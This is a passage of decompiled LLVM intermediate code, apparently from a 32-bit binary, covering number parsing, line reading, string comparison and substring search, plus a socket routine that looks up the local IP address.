  %v7_147c0 = icmp eq i32 %v1_147b8, 25
  %v2_147c4 = xor i1 %v7_147c0, true
  %v3_147c4 = and i1 %v2_147c0, %v2_147c4
  br i1 %v3_147c4, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_147c0
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_147c0, %bb55
  %v0_147d821 = phi i32 [ %v1_147b4, %dec_label_pc_147c0 ], [ 0, %bb55 ]
  %v2_147c8 = xor i1 %v2_147c0, true
  %v3_147c8 = or i1 %v7_147c0, %v2_147c8
  br i1 %v3_147c8, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_147d8 = phi i32 [ %v0_147d821, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_147c4, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_147d0 = icmp ugt i32 %v1_147b0, 24
  %v11_147d0 = icmp eq i32 %v1_147b0, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_147d4 = phi i1 [ %v7_147c0, %bb58 ], [ %v11_147d0, %bb59 ]
  %v0_147d4 = phi i1 [ %v2_147c0, %bb58 ], [ %v6_147d0, %bb59 ]
  %v2_147d4 = xor i1 %v1_147d4, true
  %v3_147d4 = and i1 %v0_147d4, %v2_147d4
  br i1 %v3_147d4, label %dec_label_pc_14830, label %dec_label_pc_147d8

dec_label_pc_147d8:                               ; preds = %bb60
  %v2_147d8 = icmp eq i32 %v0_147d8, 0
  %. = select i1 %v2_147d8, i32 87, i32 55
  %v2_147e4 = sub nsw i32 %v1_147e4, %.
  br label %dec_label_pc_147e8

dec_label_pc_147e8:                               ; preds = %dec_label_pc_147a4, %dec_label_pc_147d8
  %v0_147fc37 = phi i32 [ %v1_147b8, %dec_label_pc_147a4 ], [ %., %dec_label_pc_147d8 ]
  %v3_1482012 = phi i32 [ %v1_147b4, %dec_label_pc_147a4 ], [ %v2_147e4, %dec_label_pc_147d8 ]
  %v6_147ec = icmp slt i32 %v3_1482012, %arg2
  br i1 %v6_147ec, label %dec_label_pc_147f0, label %dec_label_pc_14830

dec_label_pc_147f0:                               ; preds = %dec_label_pc_147e8
  %v3_147f0 = icmp uge i32 %v2_1482011, %v2_14794
  %v9_147f0 = icmp eq i32 %v2_1482011, %v2_14794
  %v2_147f4 = xor i1 %v3_147f0, true
  %v3_147f4 = or i1 %v9_147f0, %v2_147f4
  br i1 %v3_147f4, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_147f0
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_147f0, %bb63
  %v0_147fc36 = phi i32 [ %v0_147fc37, %dec_label_pc_147f0 ], [ 0, %bb63 ]
  %v2_147f8 = xor i1 %v9_147f0, true
  %v3_147f8 = and i1 %v3_147f0, %v2_147f8
  br i1 %v3_147f8, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_147fc = phi i32 [ %v0_147fc36, %bb64 ], [ 1, %bb65 ]
  %tmp78 = icmp slt i32 %v1_147fc, 0
  %v4_147fc = zext i1 %tmp78 to i32
  %v5_147fc = or i32 %v0_147fc, %v4_147fc
  %v7_147fc = icmp eq i32 %v5_147fc, 0
  br i1 %v7_147fc, label %dec_label_pc_14808, label %.thread8

dec_label_pc_14808:                               ; preds = %bb66
  %v7_14818 = icmp sgt i32 %v3_1482012, %v2_14784
  br i1 %v7_14818, label %bb69, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_14808
  br label %bb70

bb69:                                             ; preds = %dec_label_pc_14808
  %v2_1481c = icmp eq i1 %v9_147f0, false
  br i1 %v2_1481c, label %bb70, label %.thread8

bb70:                                             ; preds = %bb69, %.thread5
  %v4_1482013 = mul i32 %v2_1482011, %arg2
  %v5_1482014 = add i32 %v3_1482012, %v4_1482013
  br label %.thread8

.thread8:                                         ; preds = %bb69, %bb66, %bb70
  %v1_1483c29 = phi i32 [ %v2_1482011, %bb69 ], [ %v2_1482011, %bb66 ], [ %v5_1482014, %bb70 ]
  %v0_1483027 = phi i32 [ -1, %bb69 ], [ -1, %bb66 ], [ 1, %bb70 ]
  %v1_14828 = inttoptr i32 %v0_14828 to i8*
  %v2_14828 = load i8, i8* %v1_14828, align 1
  %v5_14828 = add i32 %v0_14828, 1
  br label %dec_label_pc_147a4

dec_label_pc_14830:                               ; preds = %dec_label_pc_147e8, %bb60
  %v1_14830 = icmp slt i32 %v1_147fc, 0
  %v2_14854 = icmp eq i32 %v0_14854, 0
  br i1 %v1_14830, label %dec_label_pc_14854, label %dec_label_pc_14838

dec_label_pc_14838:                               ; preds = %dec_label_pc_14830
  br i1 %v2_14854, label %bb72, label %bb71

bb71:                                             ; preds = %dec_label_pc_14838
  %v2_1483c = sub i32 0, %v2_1482011
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_14838, %bb71
  %v23_14840 = phi i32 [ %v2_1482011, %dec_label_pc_14838 ], [ %v2_1483c, %bb71 ]
  ret i32 %v23_14840

dec_label_pc_14844:                               ; preds = %dec_label_pc_14764
  %v1_14844 = inttoptr i32 %v5_14744 to i8*
  %v2_14844 = load i8, i8* %v1_14844, align 1
  %v5_14844 = add i32 %v0_14744, 2
  br label %dec_label_pc_1477c

dec_label_pc_14854:                               ; preds = %dec_label_pc_14830
  %.76 = select i1 %v2_14854, i32 2147483647, i32 -2147483648
  ret i32 %.76

; uselistorder directives
  uselistorder i1 %v9_147f0, { 1, 0, 2 }
  uselistorder i1 %v3_147f0, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_147c0, { 1, 2, 0 }
  uselistorder i1 %v2_147c0, { 1, 0, 2 }
  uselistorder i32 %v1_147a4, { 1, 2, 0 }
  uselistorder i32 %v1_147e4, { 1, 0, 2 }
  uselistorder i32 %v1_147fc, { 1, 0 }
  uselistorder i32 %v2_1482011, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_14828, { 1, 0 }
  uselistorder i32 %v2_14794, { 1, 0, 2 }
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v5_14744, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_14744, { 0, 1, 3, 2 }
  uselistorder i32 25, { 24, 25, 12, 3, 0, 4, 13, 5, 14, 6, 15, 11, 16, 17, 18, 1, 19, 7, 20, 2, 21, 8, 9, 22, 10, 23, 26, 27 }
  uselistorder i32 24, { 35, 36, 38, 13, 12, 78, 44, 79, 45, 60, 39, 14, 40, 15, 41, 16, 42, 43, 63, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 64, 59, 65, 61, 62, 80, 81, 82, 66, 83, 0, 67, 17, 1, 68, 18, 19, 2, 69, 20, 70, 71, 21, 3, 22, 23, 4, 24, 5, 25, 6, 7, 26, 8, 27, 9, 72, 28, 73, 74, 75, 29, 30, 10, 76, 31, 77, 32, 84, 85, 86, 87, 88, 33, 89, 11, 37, 34, 90 }
  uselistorder i8 32, { 7, 13, 8, 9, 0, 10, 11, 12, 1, 2, 3, 4, 5, 6, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i8 9, { 6, 4, 0, 1, 5, 2, 3 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_147e8, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_1477c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14744, { 1, 2, 0, 3 }
}

define i32 @function_14864(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14864:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_14864 = load i32, i32* @r4, align 4
  store i32 %v3_14864, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1487c

dec_label_pc_1487c:                               ; preds = %dec_label_pc_148a8.dec_label_pc_1487c_crit_edge, %dec_label_pc_14864
  %v0_14880 = phi i32 [ %v0_14880.pre, %dec_label_pc_148a8.dec_label_pc_1487c_crit_edge ], [ %arg3, %dec_label_pc_14864 ]
  %v0_1487c = phi i32 [ %v1_14894, %dec_label_pc_148a8.dec_label_pc_1487c_crit_edge ], [ %tmp, %dec_label_pc_14864 ]
  %v4_14888 = call i32 @_read(i32 %v0_14880, i32 %v0_1487c, i32 1)
  %v7_1488c = icmp eq i32 %v4_14888, 1
  %v0_14890 = load i32, i32* %r4.global-to-local, align 4
  %v1_14894 = add i32 %v0_14890, 1
  store i32 %v1_14894, i32* %r4.global-to-local, align 4
  %v0_1489c = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_1488c, label %dec_label_pc_1489c, label %dec_label_pc_148b4

dec_label_pc_1489c:                               ; preds = %dec_label_pc_1487c
  %v1_1489c = add i32 %v0_1489c, 1
  store i32 %v1_1489c, i32* %r5.global-to-local, align 4
  %v0_148a0 = load i32, i32* %r7.global-to-local, align 4
  %v7_148a4 = icmp sgt i32 %v0_148a0, %v1_1489c
  br i1 %v7_148a4, label %dec_label_pc_148a8, label %dec_label_pc_148b4

dec_label_pc_148a8:                               ; preds = %dec_label_pc_1489c
  %v1_148a8 = inttoptr i32 %v0_14890 to i8*
  %v2_148a8 = load i8, i8* %v1_148a8, align 1
  %v7_148ac = icmp eq i8 %v2_148a8, 10
  br i1 %v7_148ac, label %dec_label_pc_148b4, label %dec_label_pc_148a8.dec_label_pc_1487c_crit_edge

dec_label_pc_148a8.dec_label_pc_1487c_crit_edge:  ; preds = %dec_label_pc_148a8
  %v0_14880.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1487c

dec_label_pc_148b4:                               ; preds = %dec_label_pc_1487c, %dec_label_pc_148a8, %dec_label_pc_1489c
  %v0_148b4 = phi i32 [ %v1_1489c, %dec_label_pc_148a8 ], [ %v1_1489c, %dec_label_pc_1489c ], [ %v0_1489c, %dec_label_pc_1487c ]
  %v2_148b4 = icmp eq i32 %v0_148b4, 0
  %v1_148b8 = load i32, i32* %r8.global-to-local, align 4
  %storemerge = select i1 %v2_148b4, i32 0, i32 %v1_148b8
  %v2_148c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_148c0, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_14894, { 1, 0 }
  uselistorder i8 10, { 8, 1, 0, 9, 7, 10, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32, i32, i32)* @_read, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_148b4, { 1, 2, 0 }
}

define i32 @function_148c4() local_unnamed_addr {
dec_label_pc_148c4:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v2_148cc = ptrtoint i32* %stack_var_-40 to i32
  store i32 16, i32* %stack_var_-24, align 4
  %v0_148d4 = call i32 @___errno_location()
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_148dc = inttoptr i32 %v0_148d4 to i32*
  store i32 0, i32* %v2_148dc, align 4
  %v0_148e8 = load i32, i32* %r6.global-to-local, align 4
  %v3_148ec = call i32 @_socket(i32 2, i32 2, i32 %v0_148e8)
  %v7_148f8 = icmp eq i32 %v3_148ec, -1
  store i32 %v3_148ec, i32* %r5.global-to-local, align 4
  %v2_14904 = load i32, i32* %r4.global-to-local, align 4
  br i1 %v7_148f8, label %dec_label_pc_14954, label %dec_label_pc_14918

dec_label_pc_14918:                               ; preds = %dec_label_pc_148c4
  %v7_14904 = shl i32 2056, %v2_14904
  %v8_14904 = or i32 %v7_14904, 2056
  store i32 2, i32* %stack_var_-40, align 4
  %v3_14934 = call i32 @_connect(i32 %v3_148ec, i32 %v2_148cc, i32 %v2_14904)
  %v2_1493c = ptrtoint i32* %stack_var_-24 to i32
  %v0_14940 = load i32, i32* %r5.global-to-local, align 4
  %v3_14944 = call i32 @_getsockname(i32 %v0_14940, i32 %v2_148cc, i32 %v2_1493c)
  %v1_1494c = call i32 @_close(i32 %v0_14940)
  br label %dec_label_pc_14954

dec_label_pc_14954:                               ; preds = %dec_label_pc_148c4, %dec_label_pc_14918
  %v0_14954 = phi i32 [ %v0_148e8, %dec_label_pc_148c4 ], [ %v8_14904, %dec_label_pc_14918 ]
  ret i32 %v0_14954

; uselistorder directives
  uselistorder i32 %v3_148ec, { 2, 1, 0 }
  uselistorder i32 %v2_148cc, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32)* @_close, { 10, 41, 40, 9, 8, 39, 38, 7, 6, 31, 37, 36, 35, 34, 33, 32, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @_connect, { 3, 10, 2, 8, 9, 7, 6, 5, 1, 4, 0 }
  uselistorder i32 2056, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @_socket, { 6, 22, 1, 5, 20, 21, 19, 18, 17, 16, 15, 2, 14, 13, 12, 11, 4, 3, 10, 9, 8, 7, 0 }
  uselistorder i32 ()* @___errno_location, { 4, 3, 6, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_14954, { 1, 0 }
}

define i32 @function_14960(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14960:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp20 = ptrtoint i8* %arg1 to i32
  %v3_14964 = load i8, i8* %tmp, align 1
  %v2_14968 = icmp eq i8 %v3_14964, 0
  br i1 %v2_14968, label %bb, label %dec_label_pc_1497c

bb:                                               ; preds = %dec_label_pc_14960
  %v4_14964 = zext i8 %v3_14964 to i32
  br label %dec_label_pc_14990

dec_label_pc_1497c:                               ; preds = %dec_label_pc_14960
  br label %dec_label_pc_14980

dec_label_pc_14980:                               ; preds = %dec_label_pc_14980, %dec_label_pc_1497c
  %v0_14980 = phi i32 [ %v1_14980, %dec_label_pc_14980 ], [ 0, %dec_label_pc_1497c ]
  %v1_14980 = add i32 %v0_14980, 1
  %v2_14984 = add i32 %v1_14980, %arg2
  %v3_14984 = inttoptr i32 %v2_14984 to i8*
  %v4_14984 = load i8, i8* %v3_14984, align 1
  %v2_14988 = icmp eq i8 %v4_14984, 0
  br i1 %v2_14988, label %dec_label_pc_14990, label %dec_label_pc_14980

dec_label_pc_14990:                               ; preds = %dec_label_pc_14980, %bb
  %v0_149d418 = phi i32 [ %v4_14964, %bb ], [ %v1_14980, %dec_label_pc_14980 ]
  %v0_149981 = load i32, i32* @r1, align 4
  %tmp27 = icmp slt i32 %v0_149981, 1
  br i1 %tmp27, label %dec_label_pc_149e4, label %dec_label_pc_149a4

dec_label_pc_149a4:                               ; preds = %dec_label_pc_14990, %dec_label_pc_14998.backedge
  %v0_1499c.in = phi i32 [ %v0_1499c, %dec_label_pc_14998.backedge ], [ %v0_149981, %dec_label_pc_14990 ]
  %v0_149c8 = phi i32 [ %v1_149c8., %dec_label_pc_14998.backedge ], [ 0, %dec_label_pc_14990 ]
  %v0_149a4 = phi i32 [ %v5_149a4, %dec_label_pc_14998.backedge ], [ %tmp20, %dec_label_pc_14990 ]
  %v0_1499c = add i32 %v0_1499c.in, -1
  %v1_149a4 = inttoptr i32 %v0_149a4 to i8*
  %v2_149a4 = load i8, i8* %v1_149a4, align 1
  %v3_149a4 = zext i8 %v2_149a4 to i32
  %v5_149a4 = add i32 %v0_149a4, 1
  %v2_149a8 = add i32 %v0_149c8, %arg2
  %v3_149a8 = inttoptr i32 %v2_149a8 to i8*
  %v4_149a8 = load i8, i8* %v3_149a8, align 1
  %v6_149a8 = zext i8 %v4_149a8 to i32
  %v1_149ac = add nsw i32 %v3_149a4, -65
  %v1_149b0 = add nsw i32 %v6_149a8, -65
  %tmp35 = icmp ult i32 %v1_149ac, 26
  br i1 %tmp35, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_149a4
  %v5_149b8 = or i32 %v3_149a4, 96
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_149a4, %bb28
  %v0_149c4 = phi i32 [ %v3_149a4, %dec_label_pc_149a4 ], [ %v5_149b8, %bb28 ]
  %tmp36 = icmp ult i32 %v1_149b0, 26
  br i1 %tmp36, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  %v5_149c0 = or i32 %v6_149a8, 96
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v1_149c4 = phi i32 [ %v6_149a8, %bb29 ], [ %v5_149c0, %bb30 ]
  %v9_149c4 = icmp eq i32 %v0_149c4, %v1_149c4
  %v1_149c8 = add i32 %v0_149c8, 1
  %v1_149c8. = select i1 %v9_149c4, i32 %v1_149c8, i32 0
  br i1 %v9_149c4, label %dec_label_pc_149d4, label %dec_label_pc_14998.backedge

dec_label_pc_14998.backedge:                      ; preds = %bb31, %dec_label_pc_149d4
  %tmp32 = icmp slt i32 %v0_1499c, 1
  br i1 %tmp32, label %dec_label_pc_149e4, label %dec_label_pc_149a4

dec_label_pc_149d4:                               ; preds = %bb31
  %v9_149d4 = icmp eq i32 %v0_149d418, %v1_149c8.
  br i1 %v9_149d4, label %dec_label_pc_149dc, label %dec_label_pc_14998.backedge

dec_label_pc_149dc:                               ; preds = %dec_label_pc_149d4
  %v2_149dc = sub i32 %v5_149a4, %tmp20
  ret i32 %v2_149dc

dec_label_pc_149e4:                               ; preds = %dec_label_pc_14998.backedge, %dec_label_pc_14990
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_149c8., { 1, 0 }
  uselistorder i32 %v0_149a4, { 1, 0 }
  uselistorder i32 %v0_149c8, { 1, 0 }
  uselistorder i8 %v3_14964, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder i32* @r1, { 1, 33, 34, 32, 27, 2, 3, 4, 5, 30, 31, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 29, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder label %dec_label_pc_14998.backedge, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_149a4, { 1, 0 }
}

define i32 @function_149ec(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_149ec:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_149ec = load i8, i8* %arg1, align 1
  %v2_149f0 = icmp eq i8 %v2_149ec, 0
  br i1 %v2_149f0, label %bb, label %dec_label_pc_149fc

bb:                                               ; preds = %dec_label_pc_149ec
  %v3_149ec = zext i8 %v2_149ec to i32
  br label %dec_label_pc_14a10

dec_label_pc_149fc:                               ; preds = %dec_label_pc_149ec
  br label %dec_label_pc_14a00

dec_label_pc_14a00:                               ; preds = %dec_label_pc_14a00, %dec_label_pc_149fc
  %v0_14a00 = phi i32 [ %v1_14a00, %dec_label_pc_14a00 ], [ 0, %dec_label_pc_149fc ]
  %v1_14a00 = add i32 %v0_14a00, 1
  %v2_14a04 = add i32 %v1_14a00, %tmp
  %v3_14a04 = inttoptr i32 %v2_14a04 to i8*
  %v4_14a04 = load i8, i8* %v3_14a04, align 1
  %v2_14a08 = icmp eq i8 %v4_14a04, 0
  br i1 %v2_14a08, label %dec_label_pc_14a10, label %dec_label_pc_14a00

dec_label_pc_14a10:                               ; preds = %dec_label_pc_14a00, %bb
  %v1_14a34 = phi i32 [ %v3_149ec, %bb ], [ %v1_14a00, %dec_label_pc_14a00 ]
  %v1_14a10 = inttoptr i32 %arg2 to i8*
  %v2_14a10 = load i8, i8* %v1_14a10, align 1
  %v2_14a14 = icmp eq i8 %v2_14a10, 0
  br i1 %v2_14a14, label %bb22, label %dec_label_pc_14a20

bb22:                                             ; preds = %dec_label_pc_14a10
  %v3_14a10 = zext i8 %v2_14a10 to i32
  br label %dec_label_pc_14a34

dec_label_pc_14a20:                               ; preds = %dec_label_pc_14a10
  br label %dec_label_pc_14a24

dec_label_pc_14a24:                               ; preds = %dec_label_pc_14a24, %dec_label_pc_14a20
  %v0_14a24 = phi i32 [ %v1_14a24, %dec_label_pc_14a24 ], [ 0, %dec_label_pc_14a20 ]
  %v1_14a24 = add i32 %v0_14a24, 1
  %v2_14a28 = add i32 %v1_14a24, %arg2
  %v3_14a28 = inttoptr i32 %v2_14a28 to i8*
  %v4_14a28 = load i8, i8* %v3_14a28, align 1
  %v2_14a2c = icmp eq i8 %v4_14a28, 0
  br i1 %v2_14a2c, label %dec_label_pc_14a34, label %dec_label_pc_14a24

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a24, %bb22
  %v0_14a604 = phi i32 [ %v3_14a10, %bb22 ], [ %v1_14a24, %dec_label_pc_14a24 ]
  %v9_14a34 = icmp eq i32 %v0_14a604, %v1_14a34
  br i1 %v9_14a34, label %dec_label_pc_14a60.preheader, label %dec_label_pc_14a40

dec_label_pc_14a60.preheader:                     ; preds = %dec_label_pc_14a34
  %v2_14a606 = icmp eq i32 %v1_14a34, 0
  br i1 %v2_14a606, label %dec_label_pc_14a68, label %dec_label_pc_14a48

dec_label_pc_14a40:                               ; preds = %dec_label_pc_14a48, %dec_label_pc_14a34
  ret i32 0

dec_label_pc_14a48:                               ; preds = %dec_label_pc_14a58, %dec_label_pc_14a60.preheader
  %v0_14a60.in = phi i32 [ %v0_14a60, %dec_label_pc_14a58 ], [ %v1_14a34, %dec_label_pc_14a60.preheader ]
  %v0_14a5c = phi i32 [ %v1_14a5c, %dec_label_pc_14a58 ], [ %arg2, %dec_label_pc_14a60.preheader ]
  %v0_14a58 = phi i32 [ %v1_14a58, %dec_label_pc_14a58 ], [ %tmp, %dec_label_pc_14a60.preheader ]
  %v0_14a60 = add i32 %v0_14a60.in, -1
  %v1_14a48 = inttoptr i32 %v0_14a58 to i8*
  %v2_14a48 = load i8, i8* %v1_14a48, align 1
  %v1_14a4c = inttoptr i32 %v0_14a5c to i8*
  %v2_14a4c = load i8, i8* %v1_14a4c, align 1
  %v9_14a50 = icmp eq i8 %v2_14a48, %v2_14a4c
  br i1 %v9_14a50, label %dec_label_pc_14a58, label %dec_label_pc_14a40

dec_label_pc_14a58:                               ; preds = %dec_label_pc_14a48
  %v1_14a58 = add i32 %v0_14a58, 1
  %v1_14a5c = add i32 %v0_14a5c, 1
  %v2_14a60 = icmp eq i32 %v0_14a60, 0
  br i1 %v2_14a60, label %dec_label_pc_14a68, label %dec_label_pc_14a48

dec_label_pc_14a68:                               ; preds = %dec_label_pc_14a58, %dec_label_pc_14a60.preheader
  ret i32 1

; uselistorder directives
  uselistorder i8 %v2_14a10, { 1, 0 }
  uselistorder i8 %v2_149ec, { 1, 0 }
}

define i32 @function_14a70(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14a70:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_14a74 = load i8, i8* %arg1, align 1
  %v2_14a78 = icmp eq i8 %v2_14a74, 0
  %v0_14a7c = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_14a78, label %bb, label %dec_label_pc_14a88

bb:                                               ; preds = %dec_label_pc_14a70
  %v3_14a74 = zext i8 %v2_14a74 to i32
  br label %dec_label_pc_14a9c

dec_label_pc_14a88:                               ; preds = %dec_label_pc_14a70
  br label %dec_label_pc_14a8c

dec_label_pc_14a8c:                               ; preds = %dec_label_pc_14a8c, %dec_label_pc_14a88
  %v0_14a8c = phi i32 [ %v1_14a8c, %dec_label_pc_14a8c ], [ 0, %dec_label_pc_14a88 ]
  %v1_14a8c = add i32 %v0_14a8c, 1
  %v2_14a90 = add i32 %v1_14a8c, %tmp
  %v3_14a90 = inttoptr i32 %v2_14a90 to i8*
  %v4_14a90 = load i8, i8* %v3_14a90, align 1
  %v2_14a94 = icmp eq i8 %v4_14a90, 0
  br i1 %v2_14a94, label %dec_label_pc_14a9c, label %dec_label_pc_14a8c

dec_label_pc_14a9c:                               ; preds = %dec_label_pc_14a8c, %bb
  %v9_14ac4 = phi i32 [ %v3_14a74, %bb ], [ %v1_14a8c, %dec_label_pc_14a8c ]
  %v0_14a9c = load i32, i32* %r1.global-to-local, align 4
  %v1_14a9c = inttoptr i32 %v0_14a9c to i8*
  %v2_14a9c = load i8, i8* %v1_14a9c, align 1
  %v3_14a9c = zext i8 %v2_14a9c to i32
  %v2_14aa0 = icmp eq i8 %v2_14a9c, 0
  br i1 %v2_14aa0, label %bb26, label %dec_label_pc_14aac

bb26:                                             ; preds = %dec_label_pc_14a9c
  store i32 %v3_14a9c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14ac0

dec_label_pc_14aac:                               ; preds = %dec_label_pc_14a9c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14ab0

dec_label_pc_14ab0:                               ; preds = %dec_label_pc_14ab0, %dec_label_pc_14aac
  %v0_14ab0 = phi i32 [ %v1_14ab0, %dec_label_pc_14ab0 ], [ 0, %dec_label_pc_14aac ]
  %v1_14ab0 = add i32 %v0_14ab0, 1
  store i32 %v1_14ab0, i32* %r2.global-to-local, align 4
  %v2_14ab4 = add i32 %v1_14ab0, %v0_14a9c
  %v3_14ab4 = inttoptr i32 %v2_14ab4 to i8*
  %v4_14ab4 = load i8, i8* %v3_14ab4, align 1
  %v2_14ab8 = icmp eq i8 %v4_14ab4, 0
  br i1 %v2_14ab8, label %dec_label_pc_14ac0, label %dec_label_pc_14ab0

dec_label_pc_14ac0:                               ; preds = %dec_label_pc_14ab0, %bb26
  %v1_14ac0 = phi i32 [ %v3_14a9c, %bb26 ], [ %v1_14ab0, %dec_label_pc_14ab0 ]
  %v2_14ac0 = sub i32 %v0_14a7c, %v1_14ac0
  %v4_14ac0 = xor i32 %v1_14ac0, %v0_14a7c
  %v5_14ac0 = xor i32 %v2_14ac0, %v0_14a7c
  %v6_14ac0 = and i32 %v5_14ac0, %v4_14ac0
  %v7_14ac4 = icmp sgt i32 %v0_14a7c, %v1_14ac0
  br i1 %v7_14ac4, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_14ac0
  %v10_14ac4 = sub i32 %v0_14a7c, %v9_14ac4
  %v12_14ac4 = xor i32 %v9_14ac4, %v0_14a7c
  %v13_14ac4 = xor i32 %v10_14ac4, %v0_14a7c
  %v14_14ac4 = and i32 %v13_14ac4, %v12_14ac4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_14ac0, %bb27
  %v2_14ac8.in = phi i32 [ %v6_14ac0, %dec_label_pc_14ac0 ], [ %v14_14ac4, %bb27 ]
  %v1_14ac8.in = phi i32 [ %v2_14ac0, %dec_label_pc_14ac0 ], [ %v10_14ac4, %bb27 ]
  %v1_14ac0.pn = phi i32 [ %v1_14ac0, %dec_label_pc_14ac0 ], [ %v9_14ac4, %bb27 ]
  %v0_14ac8 = icmp eq i32 %v0_14a7c, %v1_14ac0.pn
  %v1_14ac8 = icmp slt i32 %v1_14ac8.in, 0
  %v2_14ac8 = icmp slt i32 %v2_14ac8.in, 0
  %v3_14ac8 = xor i1 %v2_14ac8, %v1_14ac8
  %v4_14ac8 = or i1 %v0_14ac8, %v3_14ac8
  br i1 %v4_14ac8, label %dec_label_pc_14ad8.preheader, label %dec_label_pc_14af0

dec_label_pc_14ad8.preheader:                     ; preds = %bb28
  %v2_14ad85 = icmp eq i32 %v0_14a7c, 0
  br i1 %v2_14ad85, label %dec_label_pc_14af8, label %dec_label_pc_14ae0

dec_label_pc_14ad0:                               ; preds = %dec_label_pc_14ae0
  %v1_14ad0 = add i32 %v0_14ad0, 1
  %v1_14ad4 = add i32 %v0_14ad4, 1
  store i32 %v1_14ad4, i32* %r1.global-to-local, align 4
  %v2_14ad8 = icmp eq i32 %v0_14ad8, 0
  br i1 %v2_14ad8, label %dec_label_pc_14af8, label %dec_label_pc_14ae0

dec_label_pc_14ae0:                               ; preds = %dec_label_pc_14ad0, %dec_label_pc_14ad8.preheader
  %v0_14ad8.in = phi i32 [ %v0_14ad8, %dec_label_pc_14ad0 ], [ %v0_14a7c, %dec_label_pc_14ad8.preheader ]
  %v0_14ad4 = phi i32 [ %v1_14ad4, %dec_label_pc_14ad0 ], [ %v0_14a9c, %dec_label_pc_14ad8.preheader ]
  %v0_14ad0 = phi i32 [ %v1_14ad0, %dec_label_pc_14ad0 ], [ %tmp, %dec_label_pc_14ad8.preheader ]
